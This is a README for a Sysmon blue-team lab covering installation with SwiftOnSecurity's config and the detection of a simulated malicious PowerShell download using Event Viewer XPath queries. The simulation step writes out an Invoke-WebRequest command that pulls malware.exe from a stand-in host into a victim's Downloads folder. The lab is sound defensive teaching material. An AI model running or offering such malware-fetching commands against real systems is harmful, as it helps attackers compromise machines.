# Sysmon Blue Team Lab 🛡️

This repository serves as a **laboratory** to showcase my skills in **security monitoring** using **Sysmon** on Windows systems. In this lab, I will walk you through the installation of Sysmon, configuring it using the recommended **SwiftOnSecurity's Sysmon Config**, and performing basic analysis to detect suspicious activities.

---

## **Table of Contents** 📚

- [Introduction](#introduction)
- [Prerequisites](#prerequisites)
- [Step 1: Download and Install Sysmon](#step-1-download-and-install-sysmon)
- [Step 2: Configure Sysmon](#step-2-configure-sysmon)
- [Step 3: Analyze Sysmon Logs](#step-3-analyze-sysmon-logs)
- [Contributing](#contributing)

---

## **Introduction** 🎯

**Sysmon** (System Monitor) is a powerful Windows system service and device driver developed by Microsoft’s Sysinternals suite. It provides detailed information about system activity, which can be used for detecting malicious behavior, performing incident response, and creating a comprehensive security monitoring setup.

In this lab, we will be setting up Sysmon with the configuration file recommended by **SwiftOnSecurity** to monitor various system events such as process creations, network connections, file modifications, and registry changes. This configuration helps to identify suspicious or anomalous activities that might indicate a cyber attack.

---

## **Prerequisites** ⚙️

Before proceeding, ensure you have the following:

- **Windows OS** (Windows 10 or Server 2016 and above)
- **Sysmon** (downloadable from the Sysinternals suite)
- **SwiftOnSecurity's Sysmon Config**: This is the configuration file we will use, which is designed for security monitoring.
- Administrator privileges 🔑
- Basic understanding of cybersecurity and security monitoring principles 🔍

---

## **Step 1: Download and Install Sysmon** 📥

Follow these steps to download and install Sysmon:

1. **Download Sysmon** from the official [Sysinternals website](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon).
2. **Extract** the downloaded zip file to a location on your machine.
3. **Open PowerShell as Administrator** and navigate to the Sysmon folder.
---

## Step 2: Configure Sysmon Using SwiftOnSecurity's Sysmon Config ⚙️

The SwiftOnSecurity GitHub repository provides a community-vetted sysmonconfig.xml that’s designed to monitor key system activities like process creation, network connections, file changes, and registry modifications. This configuration is ideal for detecting malicious activities on Windows systems.

Visit the official SwiftOnSecurity Sysmon Config repository: https://github.com/SwiftOnSecurity/sysmon-config

Download the latest sysmonconfig.xml file from the repository and save it in your Sysmon folder (where you extracted Sysmon).

The following command will install the system, with the configuration file
```powershell
    sysmon -accepteula -i sysmonconfig-export.xml
```
After installation, verify that Sysmon is running by checking the Event Viewer for Sysmon logs:
```powershell
    Applications and Services Logs > Microsoft > Windows > Sysmon > Operational
```
You should see events for process creation, network connections, and other monitored activities.

## Step 3: Detecting Malicious Activity Using Sysmon Logs 🚨

In this section, we will simulate and analyze a malicious PowerShell execution that downloads a suspicious file from an untrusted IP address.
Scenario: Detecting PowerShell-based Malware Execution

Let’s simulate a scenario where an attacker uses PowerShell to download a malicious file from a remote IP address. You can imagine this is a real-world situation where an attacker is trying to compromise a system using PowerShell Empire or Cobalt Strike.
Simulating Malicious PowerShell Execution:

1. Create a PowerShell script (simulation):
   The attacker may execute a PowerShell command like:
   ```powershell
   Invoke-WebRequest -Uri http://maliciousdomain.com/malware.exe -OutFile C:\Users\Victim\Downloads\malware.exe
   ```
   This PowerShell script downloads a malicious file (malware.exe) from a suspicious IP and saves it to a Downloads folder.

2. Trigger the Attack Simulation:

    To simulate the attack, you can execute the script or any PowerShell command that attempts to download a file from an untrusted source. You can either run this script manually or automate it for testing purposes.

3. Analyze Sysmon Logs:

Once the attack is triggered, Sysmon will log events related to the PowerShell execution and the network connection to the malicious IP.

  Step 1: Open Event Viewer and navigate to:
  ```powershell
  Applications and Services Logs > Microsoft > Windows > Sysmon > Operational
  ```
  Step 2: Search for events related to PowerShell execution:
  
  Use the XPath query to search for PowerShell executions:
  ```powershell
      *[EventData[Data[@Name='Image'] and (Data='powershell.exe')]]
  ```
  Step 3: Look for Network Connection Events that may indicate a connection to a suspicious IP:
  
  Use the XPath query to search for network connections to untrusted IPs:
  ```powershell
      *[EventData[Data[@Name='DestinationIp'] and (Data='192.168.1.100')]]
  ```
  Step 4: Once suspicious PowerShell execution and network connection events are found, review the event details:
  
  . PowerShell process information (e.g., parameters, parent processes)
  
  . The destination IP (could be a known malicious IP)
  
  . File creation events (e.g., file being saved to Downloads)
